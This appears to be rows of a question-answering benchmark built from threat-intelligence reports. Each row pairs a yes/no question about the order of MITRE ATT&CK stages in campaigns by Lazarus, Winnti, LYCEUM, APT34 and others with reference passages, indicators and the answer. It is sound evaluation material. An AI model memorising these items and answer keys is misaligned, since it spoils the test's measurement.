Discovery: The Lazarus Group collected information about users, network settings, and processes using system utilities like net user, adfind, tasklist.exe, and systeminfo.exe. They also used the SMBMap utility to discover shared folders within the network.
Command and Control: The Lazarus Group's malware used the standard HTTP protocol to connect to the C2 servers, which were disguised as legitimate domains and hosted on resources located in various countries.
Others: The Lazarus Group, also known as Hidden Cobra, has been operating since at least 2009 and is thought to be a government-sponsored APT group from North Korea. The group's main attack vector is targeted phishing through third-party resources. The group's TTPs allowed them to gain partial control over the pharmaceutical company's infrastructure within four days. The attackers used both publicly available software and tools of their own design. The incident response and threat intelligence teams at PT Expert Security Center were involved in the investigation and response to the attack.",Yes,Lazarus Group Recruitment_ Threat Hunters vs Head Hunters
1084,236,236-Persistence-T1547-Boot or Logon Autostart Execution,"After using the Windows command line and the SQLite DLL library to execute malicious code, is the Lazarus Group likely to create services using sc.exe and place shortcuts in the startup folder for persistence before escalating privileges by creating local administrator accounts?","Persistence: To maintain their foothold, the Lazarus Group created services using the sc.exe utility and local administrator accounts. They also placed shortcuts in the startup folder for persistence.","Reconnaissance: In September 2020, the Lazarus Group initiated a cyber attack on a large pharmaceutical company. The attack began with the delivery of malicious documents containing job offers to company employees. These documents, once opened, activated malicious macros on the victims' home computers. The attackers used system utilities like ipconfig.exe, ping.exe, and net.exe for reconnaissance, as well as unknown PE files. The backdoor named CommsCacher and its configuration file encrypted with the VEST algorithm were used to monitor RDP sessions on the compromised computer. The attackers attempted to connect to the domain forecareer[.]com, which was registered shortly before the attack and mimicked the official website of General Dynamics Mission Systems.
Initial Access: The initial access to the pharmaceutical company's network was achieved when employees opened malicious documents sent to them, which contained job offers. These documents were named GD2020090939393903.doc and GD20200909GAB31.doc. The attack vectors included LinkedIn, Telegram, WhatsApp, and corporate email. The documents activated malicious macros on the victims' home computers.
Execution: The Lazarus Group executed malicious code using system utilities and a backdoor named CommsCacher. They also used the Windows command line to run commands and leveraged the legitimate SQLite DLL library with a malicious exported function sqlite3_create_functionex for execution.
Privilege Escalation: The Lazarus Group escalated privileges by creating local administrator accounts and manipulating system processes and services.
Defense Evasion: The group used various techniques to evade detection, including encrypting configuration files with the VEST algorithm, hiding malware in hidden folders at C:\ProgramData, and removing malware samples from the file system. They also used rundll32.exe to launch a malicious DLL.
Discovery: The Lazarus Group collected information about users, network settings, and processes using system utilities like net user, adfind, tasklist.exe, and systeminfo.exe. They also used the SMBMap utility to discover shared folders within the network.
Lateral Movement: The group used compromised legitimate privileged accounts to move laterally on the network and their own data encryption algorithm to communicate with the C2 servers.
Command and Control: The Lazarus Group's malware used the standard HTTP protocol to connect to the C2 servers, which were disguised as legitimate domains and hosted on resources located in various countries.
Others: The Lazarus Group, also known as Hidden Cobra, has been operating since at least 2009 and is thought to be a government-sponsored APT group from North Korea. The group's main attack vector is targeted phishing through third-party resources. The group's TTPs allowed them to gain partial control over the pharmaceutical company's infrastructure within four days. The attackers used both publicly available software and tools of their own design. The incident response and threat intelligence teams at PT Expert Security Center were involved in the investigation and response to the attack.",Yes,Lazarus Group Recruitment_ Threat Hunters vs Head Hunters
1092,236,236-Privilege Escalation-T1543-Create or Modify System Process,Is it likely that the Lazarus Group executed malicious code using system utilities and the CommsCacher backdoor before escalating privileges by manipulating system processes and services?,Privilege Escalation: The Lazarus Group escalated privileges by creating local administrator accounts and manipulating system processes and services.,"Reconnaissance: In September 2020, the Lazarus Group initiated a cyber attack on a large pharmaceutical company. The attack began with the delivery of malicious documents containing job offers to company employees. These documents, once opened, activated malicious macros on the victims' home computers. The attackers used system utilities like ipconfig.exe, ping.exe, and net.exe for reconnaissance, as well as unknown PE files. The backdoor named CommsCacher and its configuration file encrypted with the VEST algorithm were used to monitor RDP sessions on the compromised computer. The attackers attempted to connect to the domain forecareer[.]com, which was registered shortly before the attack and mimicked the official website of General Dynamics Mission Systems.
Initial Access: The initial access to the pharmaceutical company's network was achieved when employees opened malicious documents sent to them, which contained job offers. These documents were named GD2020090939393903.doc and GD20200909GAB31.doc. The attack vectors included LinkedIn, Telegram, WhatsApp, and corporate email. The documents activated malicious macros on the victims' home computers.
Execution: The Lazarus Group executed malicious code using system utilities and a backdoor named CommsCacher. They also used the Windows command line to run commands and leveraged the legitimate SQLite DLL library with a malicious exported function sqlite3_create_functionex for execution.
Persistence: To maintain their foothold, the Lazarus Group created services using the sc.exe utility and local administrator accounts. They also placed shortcuts in the startup folder for persistence.
Defense Evasion: The group used various techniques to evade detection, including encrypting configuration files with the VEST algorithm, hiding malware in hidden folders at C:\ProgramData, and removing malware samples from the file system. They also used rundll32.exe to launch a malicious DLL.
Discovery: The Lazarus Group collected information about users, network settings, and processes using system utilities like net user, adfind, tasklist.exe, and systeminfo.exe. They also used the SMBMap utility to discover shared folders within the network.
Lateral Movement: The group used compromised legitimate privileged accounts to move laterally on the network and their own data encryption algorithm to communicate with the C2 servers.
Command and Control: The Lazarus Group's malware used the standard HTTP protocol to connect to the C2 servers, which were disguised as legitimate domains and hosted on resources located in various countries.
Others: The Lazarus Group, also known as Hidden Cobra, has been operating since at least 2009 and is thought to be a government-sponsored APT group from North Korea. The group's main attack vector is targeted phishing through third-party resources. The group's TTPs allowed them to gain partial control over the pharmaceutical company's infrastructure within four days. The attackers used both publicly available software and tools of their own design. The incident response and threat intelligence teams at PT Expert Security Center were involved in the investigation and response to the attack.",Yes,Lazarus Group Recruitment_ Threat Hunters vs Head Hunters
1093,236,236-Discovery-T1087-Account Discovery,"After using tools like ipconfig.exe and ping.exe for reconnaissance, is the Lazarus Group likely to collect information about accounts using the ""net user"" utility before escalating privileges by creating local administrator accounts?","Discovery: The Lazarus Group collected information about users, network settings, and processes using system utilities like net user, adfind, tasklist.exe, and systeminfo.exe. They also used the SMBMap utility to discover shared folders within the network.","Reconnaissance: In September 2020, the Lazarus Group initiated a cyber attack on a large pharmaceutical company. The attack began with the delivery of malicious documents containing job offers to company employees. These documents, once opened, activated malicious macros on the victims' home computers. The attackers used system utilities like ipconfig.exe, ping.exe, and net.exe for reconnaissance, as well as unknown PE files. The backdoor named CommsCacher and its configuration file encrypted with the VEST algorithm were used to monitor RDP sessions on the compromised computer. The attackers attempted to connect to the domain forecareer[.]com, which was registered shortly before the attack and mimicked the official website of General Dynamics Mission Systems.
Initial Access: The initial access to the pharmaceutical company's network was achieved when employees opened malicious documents sent to them, which contained job offers. These documents were named GD2020090939393903.doc and GD20200909GAB31.doc. The attack vectors included LinkedIn, Telegram, WhatsApp, and corporate email. The documents activated malicious macros on the victims' home computers.
Execution: The Lazarus Group executed malicious code using system utilities and a backdoor named CommsCacher. They also used the Windows command line to run commands and leveraged the legitimate SQLite DLL library with a malicious exported function sqlite3_create_functionex for execution.
Persistence: To maintain their foothold, the Lazarus Group created services using the sc.exe utility and local administrator accounts. They also placed shortcuts in the startup folder for persistence.
Privilege Escalation: The Lazarus Group escalated privileges by creating local administrator accounts and manipulating system processes and services.
Defense Evasion: The group used various techniques to evade detection, including encrypting configuration files with the VEST algorithm, hiding malware in hidden folders at C:\ProgramData, and removing malware samples from the file system. They also used rundll32.exe to launch a malicious DLL.
Lateral Movement: The group used compromised legitimate privileged accounts to move laterally on the network and their own data encryption algorithm to communicate with the C2 servers.
Command and Control: The Lazarus Group's malware used the standard HTTP protocol to connect to the C2 servers, which were disguised as legitimate domains and hosted on resources located in various countries.
Others: The Lazarus Group, also known as Hidden Cobra, has been operating since at least 2009 and is thought to be a government-sponsored APT group from North Korea. The group's main attack vector is targeted phishing through third-party resources. The group's TTPs allowed them to gain partial control over the pharmaceutical company's infrastructure within four days. The attackers used both publicly available software and tools of their own design. The incident response and threat intelligence teams at PT Expert Security Center were involved in the investigation and response to the attack.",Yes,Lazarus Group Recruitment_ Threat Hunters vs Head Hunters
1095,236,236-Discovery-T1057-Process Discovery,"After evading defenses by encrypting configuration files with the VEST algorithm and hiding malware in C:\ProgramData, is it likely that the Lazarus Group will collect information about processes using tools like tasklist.exe before moving laterally within the network using compromised legitimate privileged accounts?","Discovery: The Lazarus Group collected information about users, network settings, and processes using system utilities like net user, adfind, tasklist.exe, and systeminfo.exe. They also used the SMBMap utility to discover shared folders within the network.","Reconnaissance: In September 2020, the Lazarus Group initiated a cyber attack on a large pharmaceutical company. The attack began with the delivery of malicious documents containing job offers to company employees. These documents, once opened, activated malicious macros on the victims' home computers. The attackers used system utilities like ipconfig.exe, ping.exe, and net.exe for reconnaissance, as well as unknown PE files. The backdoor named CommsCacher and its configuration file encrypted with the VEST algorithm were used to monitor RDP sessions on the compromised computer. The attackers attempted to connect to the domain forecareer[.]com, which was registered shortly before the attack and mimicked the official website of General Dynamics Mission Systems.
Initial Access: The initial access to the pharmaceutical company's network was achieved when employees opened malicious documents sent to them, which contained job offers. These documents were named GD2020090939393903.doc and GD20200909GAB31.doc. The attack vectors included LinkedIn, Telegram, WhatsApp, and corporate email. The documents activated malicious macros on the victims' home computers.
Execution: The Lazarus Group executed malicious code using system utilities and a backdoor named CommsCacher. They also used the Windows command line to run commands and leveraged the legitimate SQLite DLL library with a malicious exported function sqlite3_create_functionex for execution.
Persistence: To maintain their foothold, the Lazarus Group created services using the sc.exe utility and local administrator accounts. They also placed shortcuts in the startup folder for persistence.
Privilege Escalation: The Lazarus Group escalated privileges by creating local administrator accounts and manipulating system processes and services.
Defense Evasion: The group used various techniques to evade detection, including encrypting configuration files with the VEST algorithm, hiding malware in hidden folders at C:\ProgramData, and removing malware samples from the file system. They also used rundll32.exe to launch a malicious DLL.
Lateral Movement: The group used compromised legitimate privileged accounts to move laterally on the network and their own data encryption algorithm to communicate with the C2 servers.
Command and Control: The Lazarus Group's malware used the standard HTTP protocol to connect to the C2 servers, which were disguised as legitimate domains and hosted on resources located in various countries.
Others: The Lazarus Group, also known as Hidden Cobra, has been operating since at least 2009 and is thought to be a government-sponsored APT group from North Korea. The group's main attack vector is targeted phishing through third-party resources. The group's TTPs allowed them to gain partial control over the pharmaceutical company's infrastructure within four days. The attackers used both publicly available software and tools of their own design. The incident response and threat intelligence teams at PT Expert Security Center were involved in the investigation and response to the attack.",Yes,Lazarus Group Recruitment_ Threat Hunters vs Head Hunters
1096,236,236-Discovery-T1135-Network Share Discovery,"After using system utilities such as ipconfig.exe and ping.exe for reconnaissance and gaining initial access through malicious documents with job offers, is it likely that the Lazarus Group used net user and SMBMap for network share discovery before leveraging compromised legitimate privileged accounts for lateral movement across the network?","Discovery: The Lazarus Group collected information about users, network settings, and processes using system utilities like net user, adfind, tasklist.exe, and systeminfo.exe. They also used the SMBMap utility to discover shared folders within the network.","Reconnaissance: In September 2020, the Lazarus Group initiated a cyber attack on a large pharmaceutical company. The attack began with the delivery of malicious documents containing job offers to company employees. These documents, once opened, activated malicious macros on the victims' home computers. The attackers used system utilities like ipconfig.exe, ping.exe, and net.exe for reconnaissance, as well as unknown PE files. The backdoor named CommsCacher and its configuration file encrypted with the VEST algorithm were used to monitor RDP sessions on the compromised computer. The attackers attempted to connect to the domain forecareer[.]com, which was registered shortly before the attack and mimicked the official website of General Dynamics Mission Systems.
Initial Access: The initial access to the pharmaceutical company's network was achieved when employees opened malicious documents sent to them, which contained job offers. These documents were named GD2020090939393903.doc and GD20200909GAB31.doc. The attack vectors included LinkedIn, Telegram, WhatsApp, and corporate email. The documents activated malicious macros on the victims' home computers.
Execution: The Lazarus Group executed malicious code using system utilities and a backdoor named CommsCacher. They also used the Windows command line to run commands and leveraged the legitimate SQLite DLL library with a malicious exported function sqlite3_create_functionex for execution.
Persistence: To maintain their foothold, the Lazarus Group created services using the sc.exe utility and local administrator accounts. They also placed shortcuts in the startup folder for persistence.
Privilege Escalation: The Lazarus Group escalated privileges by creating local administrator accounts and manipulating system processes and services.
Defense Evasion: The group used various techniques to evade detection, including encrypting configuration files with the VEST algorithm, hiding malware in hidden folders at C:\ProgramData, and removing malware samples from the file system. They also used rundll32.exe to launch a malicious DLL.
Lateral Movement: The group used compromised legitimate privileged accounts to move laterally on the network and their own data encryption algorithm to communicate with the C2 servers.
Command and Control: The Lazarus Group's malware used the standard HTTP protocol to connect to the C2 servers, which were disguised as legitimate domains and hosted on resources located in various countries.
Others: The Lazarus Group, also known as Hidden Cobra, has been operating since at least 2009 and is thought to be a government-sponsored APT group from North Korea. The group's main attack vector is targeted phishing through third-party resources. The group's TTPs allowed them to gain partial control over the pharmaceutical company's infrastructure within four days. The attackers used both publicly available software and tools of their own design. The incident response and threat intelligence teams at PT Expert Security Center were involved in the investigation and response to the attack.",Yes,Lazarus Group Recruitment_ Threat Hunters vs Head Hunters
1098,236,236-Discovery-T1518-Software Discovery,"After using malicious macros activated by job-themed documents to achieve initial access, is it likely that the Lazarus Group will collect information about network users and settings using tools like adfind before moving laterally within the network using compromised privileged accounts?","Discovery: The Lazarus Group collected information about users, network settings, and processes using system utilities like net user, adfind, tasklist.exe, and systeminfo.exe. They also used the SMBMap utility to discover shared folders within the network.","Reconnaissance: In September 2020, the Lazarus Group initiated a cyber attack on a large pharmaceutical company. The attack began with the delivery of malicious documents containing job offers to company employees. These documents, once opened, activated malicious macros on the victims' home computers. The attackers used system utilities like ipconfig.exe, ping.exe, and net.exe for reconnaissance, as well as unknown PE files. The backdoor named CommsCacher and its configuration file encrypted with the VEST algorithm were used to monitor RDP sessions on the compromised computer. The attackers attempted to connect to the domain forecareer[.]com, which was registered shortly before the attack and mimicked the official website of General Dynamics Mission Systems.
Initial Access: The initial access to the pharmaceutical company's network was achieved when employees opened malicious documents sent to them, which contained job offers. These documents were named GD2020090939393903.doc and GD20200909GAB31.doc. The attack vectors included LinkedIn, Telegram, WhatsApp, and corporate email. The documents activated malicious macros on the victims' home computers.
Execution: The Lazarus Group executed malicious code using system utilities and a backdoor named CommsCacher. They also used the Windows command line to run commands and leveraged the legitimate SQLite DLL library with a malicious exported function sqlite3_create_functionex for execution.
Persistence: To maintain their foothold, the Lazarus Group created services using the sc.exe utility and local administrator accounts. They also placed shortcuts in the startup folder for persistence.
Privilege Escalation: The Lazarus Group escalated privileges by creating local administrator accounts and manipulating system processes and services.
Defense Evasion: The group used various techniques to evade detection, including encrypting configuration files with the VEST algorithm, hiding malware in hidden folders at C:\ProgramData, and removing malware samples from the file system. They also used rundll32.exe to launch a malicious DLL.
Lateral Movement: The group used compromised legitimate privileged accounts to move laterally on the network and their own data encryption algorithm to communicate with the C2 servers.
Command and Control: The Lazarus Group's malware used the standard HTTP protocol to connect to the C2 servers, which were disguised as legitimate domains and hosted on resources located in various countries.
Others: The Lazarus Group, also known as Hidden Cobra, has been operating since at least 2009 and is thought to be a government-sponsored APT group from North Korea. The group's main attack vector is targeted phishing through third-party resources. The group's TTPs allowed them to gain partial control over the pharmaceutical company's infrastructure within four days. The attackers used both publicly available software and tools of their own design. The incident response and threat intelligence teams at PT Expert Security Center were involved in the investigation and response to the attack.",Yes,Lazarus Group Recruitment_ Threat Hunters vs Head Hunters
1099,237,237-Initial Access-T1566-Phishing,"After registering the Winnti malware implant as a service for persistence across reboots, is it likely that the threat actor BARIUM would initiate attacks by cultivating relationships on social media before spear-phishing victims with malicious installation vectors?","Initial Access: The Winnti malware implant was introduced to various targets by two known activity groups, BARIUM and LEAD. BARIUM initiated attacks by cultivating relationships on social media and then spear-phishing victims with unsophisticated malware installation vectors, such as malicious shortcut (.lnk) files, compiled HTML help (.chm) files, or Microsoft Office documents with macros or exploits. LEAD, known for industrial espionage, often emailed a Winnti installer to potential victims or gained access through brute-forcing remote access login credentials, SQL injection, or exploiting unpatched web servers.","Persistence: The Winnti malware implant, once installed, registered itself as a service to ensure persistence across reboots. This was detected by Windows Defender ATP, which raised behavioral alerts during the installation process.
Defense Evasion: Winnti was observed masquerading as a trusted, legitimate file to avoid detection. In two known intrusions in 2015, the implant DLL was named ""ASPNET_FILTER.DLL"" to disguise it as the DLL for the ASP.NET ISAPI Filter. Microsoft researchers used anomaly detection and supervised machine learning to identify the malicious file among benign data.
Command and Control: The Winnti implant used social network profiles, collaborative document editing sites, and blogs for command and control (C&C) communication. Windows Defender ATP was capable of detecting and stopping C&C communication to prevent further malicious activities.
Others: Windows Defender ATP provides extensive threat intelligence about activity groups like BARIUM and LEAD, including their tactics, techniques, and procedures. It also offers centralized response options to quickly stop threats, such as isolating compromised computers from the network and blocking the Winnti implant across the enterprise. The upcoming Windows 10 Creators Update will enhance Windows Defender ATP's capabilities for detecting threats and providing response options like machine isolation and file blocking.",Yes,etecting-threat-actors-in-recent-german-industrial-attacks-with-windows-defender-atp
1101,237,237-Defense Evasion-T1036-Masquerading,"Is it likely that before Winnti masquerades as a trusted, legitimate file named ""ASPNET_FILTER.DLL"" for defense evasion, it ensures persistence by registering itself as a service across reboots?","Defense Evasion: Winnti was observed masquerading as a trusted, legitimate file to avoid detection. In two known intrusions in 2015, the implant DLL was named ""ASPNET_FILTER.DLL"" to disguise it as the DLL for the ASP.NET ISAPI Filter. Microsoft researchers used anomaly detection and supervised machine learning to identify the malicious file among benign data.","Initial Access: The Winnti malware implant was introduced to various targets by two known activity groups, BARIUM and LEAD. BARIUM initiated attacks by cultivating relationships on social media and then spear-phishing victims with unsophisticated malware installation vectors, such as malicious shortcut (.lnk) files, compiled HTML help (.chm) files, or Microsoft Office documents with macros or exploits. LEAD, known for industrial espionage, often emailed a Winnti installer to potential victims or gained access through brute-forcing remote access login credentials, SQL injection, or exploiting unpatched web servers.
Persistence: The Winnti malware implant, once installed, registered itself as a service to ensure persistence across reboots. This was detected by Windows Defender ATP, which raised behavioral alerts during the installation process.
Command and Control: The Winnti implant used social network profiles, collaborative document editing sites, and blogs for command and control (C&C) communication. Windows Defender ATP was capable of detecting and stopping C&C communication to prevent further malicious activities.
Others: Windows Defender ATP provides extensive threat intelligence about activity groups like BARIUM and LEAD, including their tactics, techniques, and procedures. It also offers centralized response options to quickly stop threats, such as isolating compromised computers from the network and blocking the Winnti implant across the enterprise. The upcoming Windows 10 Creators Update will enhance Windows Defender ATP's capabilities for detecting threats and providing response options like machine isolation and file blocking.",Yes,etecting-threat-actors-in-recent-german-industrial-attacks-with-windows-defender-atp
1105,238,238-Execution-T1204-User Execution,"After delivering spear phishing emails with malicious self-extracting RAR attachments to gain initial access, is it likely that the attackers would execute the XtremeRat malware disguised as legitimate documents before evading defenses by using digitally signed but untrusted certificates impersonating Microsoft?","Execution: The malware identified in the attacks includes the XtremeRat backdoor trojan, which is commercially available and has been used in various attacks over the years. This malware was found in executable files disguised as documents, such as 'IDF strikes militants in Gaza Strip following rocket barrage.doc.scr', and was signed with a digital certificate that appeared to be from Microsoft, although it was actually untrusted and faked.","Initial Access: We have observed multiple malware attacks against Israeli and Palestinian targets, likely performed by the same attacker. The attacks utilized spear phishing emails with malicious attachments, such as the one purporting to come from IDF Chief of Staff Benny Gantz. The malware files, often digitally signed to appear legitimate, were typically contained in self-extracting RAR files with misleading names that disguised their executable nature.
Defense Evasion: The attackers utilized digital signatures to make the malware appear legitimate, even though the certificates were untrusted and faked. This tactic was used to evade defenses and increase the likelihood of the malware being executed by the target.
Command and Control: The malware communicated with command-and-control (C&C) structures hosted on various DynDNS services, with IP addresses resolving to hosting services in the US. The C&C infrastructure was shared among the malware samples, indicating a coordinated attack. The IP addresses used for C&C servers changed regularly, with some remaining static for longer periods.
Others: The attacks have been ongoing for at least a year, initially focusing on Palestinian targets before shifting to Israeli targets. The purpose of the attacks is assumed to be espionage/surveillance. The attacker remains unknown, but the use of off-the-shelf malware suggests a lower-cost operation. The attacks likely involved email attachments containing malicious files within archives like RAR or ZIP. Document metadata from bait attachments revealed usernames associated with the creation and modification of the documents, providing clues about the attackers.",Yes,Cyberattack_against_Israeli_and_Palestinian_targets
1117,24,24-Defense Evasion-T1027-Obfuscated Files or Information,"After LYCEUM gained initial access through password spraying or brute-force attacks and delivering DanBot malware via spearphishing emails with malicious Excel attachments, is it likely that LYCEUM would deploy an obfuscated macro tool like DanDrop to drop the DanBot malware before utilizing it for execution of arbitrary commands via cmd.exe?","Defense Evasion: LYCEUM utilized DanDrop, a VBA macro embedded in an Excel XLS file, to drop the DanBot malware. They made incremental improvements to obfuscate the macro and refactor some of the functionality to evade defenses.","Initial Access: The LYCEUM threat group gained initial access to organizations by using account credentials obtained through password spraying or brute-force attacks. They then sent spearphishing emails with malicious Excel attachments to deliver the DanBot malware.
Execution: LYCEUM executed the DanBot malware, a first-stage remote access trojan (RAT) that uses DNS and HTTP-based communication mechanisms. The malware provides basic remote access capabilities, including the ability to execute arbitrary commands via cmd.exe and to upload and download files. Additionally, the group used a PowerShell-based keylogger (kl.ps1), a script to decrypt passwords from the RDCMan configuration file (Decrypt-RDCMan.ps1), and a script to gather account information from Active Directory (Get-LAPSP.ps1).
Credential Access: LYCEUM deployed tools such as Decrypt-RDCMan.ps1 to decrypt passwords stored in the RDCMan configuration file and Get-LAPSP.ps1 to gather account information from Active Directory, which could provide additional access within the environment.
Discovery: LYCEUM targeted HR and IT personnel with spearphishing emails to compromise accounts that could yield information and access for further spearphishing operations within the targeted environment and against associated organizations.
Command and Control: LYCEUM registered new domains for individual campaigns, which were typically used within a few weeks of registration. These domains, suspected to be part of LYCEUM's command and control infrastructure, often had a security or web technology theme.
Others: The LYCEUM threat group has been active since at least April 2018, targeting critical infrastructure organizations in the Middle East, particularly in the oil and gas sector. They have demonstrated capabilities similar to other threat groups operating in the region, such as COBALT GYPSY and COBALT TRINITY. Secureworks Counter Threat Unit researchers recommend implementing multi-factor authentication, increasing visibility via endpoint detection, response, and logging, conducting preparedness exercises, and reinforcing phishing awareness to mitigate the threat posed by LYCEUM.",Yes,Cyber Threat Group LYCEUM Takes Center Stage in Middle East Campaign
1120,24,24-Discovery-T1087-Account Discovery,"After LYCEUM utilized the Decrypt-RDCMan.ps1 script to decrypt passwords stored in the RDCMan configuration file, is it likely that they would compromise accounts for further spearphishing operations targeting HR and IT personnel to gather information and access within the targeted environment?",Discovery: LYCEUM targeted HR and IT personnel with spearphishing emails to compromise accounts that could yield information and access for further spearphishing operations within the targeted environment and against associated organizations.,"Initial Access: The LYCEUM threat group gained initial access to organizations by using account credentials obtained through password spraying or brute-force attacks. They then sent spearphishing emails with malicious Excel attachments to deliver the DanBot malware.
Execution: LYCEUM executed the DanBot malware, a first-stage remote access trojan (RAT) that uses DNS and HTTP-based communication mechanisms. The malware provides basic remote access capabilities, including the ability to execute arbitrary commands via cmd.exe and to upload and download files. Additionally, the group used a PowerShell-based keylogger (kl.ps1), a script to decrypt passwords from the RDCMan configuration file (Decrypt-RDCMan.ps1), and a script to gather account information from Active Directory (Get-LAPSP.ps1).
Defense Evasion: LYCEUM utilized DanDrop, a VBA macro embedded in an Excel XLS file, to drop the DanBot malware. They made incremental improvements to obfuscate the macro and refactor some of the functionality to evade defenses.
Credential Access: LYCEUM deployed tools such as Decrypt-RDCMan.ps1 to decrypt passwords stored in the RDCMan configuration file and Get-LAPSP.ps1 to gather account information from Active Directory, which could provide additional access within the environment.
Command and Control: LYCEUM registered new domains for individual campaigns, which were typically used within a few weeks of registration. These domains, suspected to be part of LYCEUM's command and control infrastructure, often had a security or web technology theme.
Others: The LYCEUM threat group has been active since at least April 2018, targeting critical infrastructure organizations in the Middle East, particularly in the oil and gas sector. They have demonstrated capabilities similar to other threat groups operating in the region, such as COBALT GYPSY and COBALT TRINITY. Secureworks Counter Threat Unit researchers recommend implementing multi-factor authentication, increasing visibility via endpoint detection, response, and logging, conducting preparedness exercises, and reinforcing phishing awareness to mitigate the threat posed by LYCEUM.",Yes,Cyber Threat Group LYCEUM Takes Center Stage in Middle East Campaign
1125,240,240-Exfiltration-T1052-Exfiltration Over Physical Medium,"After deploying a final payload that establishes a remote command shell to communicate with a command and control server, is it likely that the APT group will configure systems for exfiltration by creating a desktop.ini file to mimic a 'Recycle Bin' folder and collect system information such as volume names and free disk space?","Exfiltration: The APT group configured the system for data exfiltration by creating a desktop.ini file on removable and non-system drives to mimic a 'Recycle Bin' folder. They then copied files to this folder and collected system information, including volume names and free disk space. The installer also copied all .dat files used in the side-loading scenarios into the installation directories.","Execution: A new Advanced Persistent Threat (APT) group has been observed using DLL side-loading to execute malicious code. The technique involves spoofing a legitimate DLL with a malicious one, which is then executed by legitimate Windows executables. This method has been seen in use by Chinese APT groups since 2013 and has now been adopted by cybercrime groups. The payload, which has not been seen before, contains plaintext strings with politically inspired messages. The attacks targeted non-governmental organizations and other entities in Myanmar, suggesting the involvement of a Chinese APT group.
Defense Evasion: The APT group used DLL side-loading as a defense evasion technique. This involved using a clean loader, such as a renamed Microsoft antivirus component or DISM.EXE, to load a malicious DLL that decrypts and executes an encrypted payload. The payloads were encrypted using a simple XOR algorithm with keys such as 'Hapenexx is very bad' and 'HELLO_USA_PRISIDENT'. The PDB paths found in the samples suggest a common origin for the malware, with folder names like 'KilllSomeOne'. The group also took steps to conceal the malware and prepare file space for data collection, including assigning 'hidden' and 'system' attributes to files and using a sophisticated installer for the simple shell.
Command and Control: The final payload of the attack was a DLL file designed to establish a simple remote command shell, connecting back to a server with the IP address 160.20.147.254 on port 9999. The code contained a string used to generate a key for decrypting data received from the command and control server: 'Happiness is a way station between too much and too little.'",Yes,A new APT uses DLL side-loads to “KilllSomeOne” – Sophos News
1126,241,241-Initial Access-T1566-Phishing,Are Ukrainian and Polish state organizations and businesses likely to be targeted with BlackEnergy spear-phishing emails related to the current Ukrainian crisis before the malware executes techniques for bypassing UAC and defeating the signed driver requirement for Defense Evasion?,Initial Access: A large number of state organizations and businesses from various industry fields in the Ukraine and Poland have been targeted in recent attacks. The most effective infection vectors appear to be spear-phishing emails with subjects related to the current Ukrainian crisis combined with the exploitation of MS Office documents. CVE-2014-1761 was also used to spread BlackEnergy.,"Defense Evasion: BlackEnergy is a trojan which has undergone significant functional changes since it was first publicly analyzed by Arbor Networks in 2007. It has evolved from a relatively simple DDoS trojan into a sophisticated piece of modern malware with a modular architecture. The malware includes techniques for bypassing UAC, defeating the signed driver requirement in Windows, and a selection of BlackEnergy2 plug-ins used for parasitic file infections, network discovery, remote code execution, and data collection.
Others: The most recent campaigns leveraging BlackEnergy are dated August 2014. The malware has been used for sending spam, online bank fraud, and targeted attacks. BlackEnergy version 2, which featured rootkit techniques, was documented by SecureWorks in 2010. The targeted attacks recently discovered are proof that the trojan is still active. The technical analysis of the BlackEnergy family focuses on novel functionality and the differences introduced by new 'lite' variants. The many targets in the Ukraine and Poland have been infected through several known and unknown infection vectors.",Yes,LM3-LipovskyCherepanov.xml
1134,242,242-Command and Control-T1573-Encrypted Channel,"After persistence was established using a scheduled task named 'SystemFailureReporter' to execute the SideTwist payload every 5 minutes, is it likely that the SideTwist backdoor communicated with the C&C server (sarmsoftware[.]com) using encrypted HTTP channels?","Command and Control: The SideTwist backdoor communicated with the C&C server (sarmsoftware[.]com) using HTTP on port 443, with port 80 as a fallback. The backdoor used different techniques for outgoing and incoming communications, both encrypted using the Mersenne Twister pseudorandom number generator. Commands were received from the server by searching for specific patterns hidden inside the HTML content of a legitimate-looking website, in this case, a fake Flickr page.","Initial Access: Check Point Research identified a new campaign by the Iranian threat group APT34 targeting a Lebanese entity using a novel backdoor variant named SideTwist. The initial access was achieved through a malicious Microsoft Word document titled 'Job-Details.doc' (md5: 6615c410b8d7411ed14946635947325e) delivered via LinkedIn messages. The document contained embedded malicious macros that, when activated, initiated the infection process.
Execution: The malicious macros within the Word document executed a series of actions upon activation: verifying a mouse connection (anti-sandboxing), fingerprinting the target device, communicating with the C2 server, dropping an embedded executable with a '.doc' extension (later renamed to '.exe'), and registering a Windows scheduled task to launch the executable periodically.
Persistence: Persistence was established by the initial stage macros through a scheduled task named 'SystemFailureReporter,' which was set to execute the second stage payload, SideTwist, every 5 minutes.
Defense Evasion: APT34's campaign utilized DNS tunneling to avoid detection, with the initial macros stage using DNS requests to beacon back to the attacker and deliver victim identifiable information. The attacker employed the requestbin.net DNS tunneling service to receive updates about the infection progress without exposing their infrastructure.
Others: APT34, also known as OilRig, has been actively updating their payload arsenal post-2019 tool leak by Lab Dookhtegan. The group has a history of targeting individuals with job opportunity documents and has continued this method in their latest campaign. The SideTwist backdoor variant is new but provides functionality similar to other C-based backdoors used by APT34, such as DNSpionage and TONEDEAF. The campaign also involved another APT34 tool, a .NET-based backdoor named Karkoff, which used internet-facing exchange servers for communication. The Lebanese Government's exchange server (mail.army.gov[.]lb) credentials were found within the Karkoff implant, suggesting a potential long-term compromise. Check Point Sandblast provides protection against this APT attack.",Yes,Iran’s APT34 Returns with an Updated Arsenal - Check Point Research
1135,242,242-Execution-T1059-Command and Scripting Interpreter,"After gaining initial access via a malicious Microsoft Word document delivered through LinkedIn messages, is it likely that the malicious macros will execute a series of actions before persistence is established via a scheduled task named ""SystemFailureReporter""?","Execution: The malicious macros within the Word document executed a series of actions upon activation: verifying a mouse connection (anti-sandboxing), fingerprinting the target device, communicating with the C2 server, dropping an embedded executable with a '.doc' extension (later renamed to '.exe'), and registering a Windows scheduled task to launch the executable periodically.","Initial Access: Check Point Research identified a new campaign by the Iranian threat group APT34 targeting a Lebanese entity using a novel backdoor variant named SideTwist. The initial access was achieved through a malicious Microsoft Word document titled 'Job-Details.doc' (md5: 6615c410b8d7411ed14946635947325e) delivered via LinkedIn messages. The document contained embedded malicious macros that, when activated, initiated the infection process.
Persistence: Persistence was established by the initial stage macros through a scheduled task named 'SystemFailureReporter,' which was set to execute the second stage payload, SideTwist, every 5 minutes.
Defense Evasion: APT34's campaign utilized DNS tunneling to avoid detection, with the initial macros stage using DNS requests to beacon back to the attacker and deliver victim identifiable information. The attacker employed the requestbin.net DNS tunneling service to receive updates about the infection progress without exposing their infrastructure.
